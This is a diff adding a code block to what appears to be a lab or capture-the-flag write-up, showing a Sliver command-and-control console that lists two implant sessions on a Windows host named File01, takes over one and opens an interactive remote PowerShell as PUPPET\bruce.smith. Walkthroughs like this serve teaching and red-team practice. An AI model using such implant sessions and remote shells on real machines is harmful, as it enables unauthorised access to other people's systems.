@@ -144,5 +144,34 @@ sliver (BLUSHING_ERROR) >
 
 ```
 
+``` bash
+
+sliver >
+sliver > sessions
+
+ ID         Transport   Remote Address       Hostname   Username             Operating System   Health
+========== =========== ==================== ========== ==================== ================== =========
+ 433a7924   mtls        172.16.40.50:49780   File01     PUPPET\bruce.smith   windows/amd64      [ALIVE]
+ ddcf3631   mtls        172.16.40.50:49767   File01     PUPPET\bruce.smith   windows/amd64      [ALIVE]
+
+sliver > use 433a7924
+
+[*] Active session BLUSHING_ERROR (433a7924-5ce6-4826-907c-486e44e72609)
+
+sliver (BLUSHING_ERROR) > shell
+
+? This action is bad OPSEC, are you an adult? Yes
+
+[*] Wait approximately 10 seconds after exit, and press <enter> to continue
+[*] Opening shell tunnel (EOF to exit) ...
+
+[*] Started remote shell with pid 3284
+
+PS C:\Windows\system32> whoami
+whoami
+puppet\bruce.smith
+PS C:\Windows\system32>
+
+```
 
 
